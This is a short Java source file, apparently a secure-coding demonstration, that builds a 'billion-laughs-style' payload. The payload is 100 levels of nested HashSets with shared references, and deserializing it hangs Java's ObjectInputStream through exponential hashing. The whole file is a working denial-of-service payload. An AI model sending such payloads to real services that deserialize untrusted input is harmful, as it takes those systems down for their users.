package ser06j;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashSet;
import java.util.Set;

// billion-laughs-style DoS for java serialization
public class SerialDOS {
  public static void main(String[] args) throws Exception {
    deserialize(payload());
  }

  static Object deserialize(byte[] bytes) throws Exception {
    return new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject();
  }

  static byte[] payload() throws IOException {
    Set<Object> root = new HashSet<>();
    Set<Object> s1 = root;
    Set<Object> s2 = new HashSet<>();
    for (int i = 0; i < 100; i++) {
      Set<Object> t1 = new HashSet<>();
      Set<Object> t2 = new HashSet<>();
      t1.add("foo"); // make it not equal to t2 //$NON-NLS-1$
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }
    return serialize(root);
  }

  static byte[] serialize(Object o) throws IOException {
    try (ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba);) {
      oos.writeObject(o);
      return ba.toByteArray();
    }
  }
}